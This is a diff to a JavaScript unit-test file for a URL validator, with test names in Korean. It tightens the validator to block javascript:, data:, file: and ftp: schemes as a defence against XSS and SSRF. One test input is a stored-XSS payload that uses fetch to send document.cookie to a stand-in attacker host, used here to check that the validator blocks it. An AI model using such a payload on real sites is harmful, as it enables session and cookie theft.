@@ -97,9 +97,9 @@ describe("validateUrl", () => {
       expect(result).toBe("올바른 URL 형식이 아닙니다");
     });
 
-    it("미등록 프로토콜이어도 URL 형식이면 통과 (htp:// 오타 등)", () => {
+    it("http/https가 아닌 오타 프로토콜(htp://)이면 에러 메시지 반환", () => {
       const result = validateUrl("htp://example.com");
-      expect(result).toBe(null);
+      expect(result).toBe("http 또는 https 주소만 저장할 수 있습니다");
     });
 
     it("프로토콜만 있으면 에러 메시지 반환", () => {
@@ -123,20 +123,30 @@ describe("validateUrl", () => {
     });
   });
 
-  describe("기타 프로토콜", () => {
-    it("FTP URL이면 null 반환", () => {
-      const result = validateUrl("ftp://ftp.example.com");
-      expect(result).toBeNull();
+  describe("위험한 프로토콜 차단 (XSS/SSRF 방어)", () => {
+    const message = "http 또는 https 주소만 저장할 수 있습니다";
+
+    it("javascript: 스킴이면 차단 (저장형 XSS 방어)", () => {
+      expect(validateUrl("javascript:alert(1)")).toBe(message);
+      expect(validateUrl("javascript:fetch('https://attacker.com/?c='+document.cookie)")).toBe(
+        message
+      );
     });
 
-    it("data URL이면 null 반환", () => {
-      const result = validateUrl("data:text/html,<h1>Hello</h1>");
-      expect(result).toBeNull();
+    it("대소문자 섞인 JavaScript: 스킴도 차단", () => {
+      expect(validateUrl("JavaScript:alert(1)")).toBe(message);
     });
 
-    it("file 프로토콜이면 null 반환", () => {
-      const result = validateUrl("file:///home/user/file.txt");
-      expect(result).toBeNull();
+    it("data: URL이면 차단", () => {
+      expect(validateUrl("data:text/html,<h1>Hello</h1>")).toBe(message);
+    });
+
+    it("file: 프로토콜이면 차단", () => {
+      expect(validateUrl("file:///home/user/file.txt")).toBe(message);
+    });
+
+    it("FTP URL이면 차단", () => {
+      expect(validateUrl("ftp://ftp.example.com")).toBe(message);
     });
   });
 
@@ -212,7 +222,11 @@ describe("validateUrl", () => {
         if (result === null) {
           expect(result).toBeNull();
         } else {
-          expect(["URL을 입력해주세요", "올바른 URL 형식이 아닙니다"]).toContain(result);
+          expect([
+            "URL을 입력해주세요",
+            "올바른 URL 형식이 아닙니다",
+            "http 또는 https 주소만 저장할 수 있습니다",
+          ]).toContain(result);
         }
       });
     });
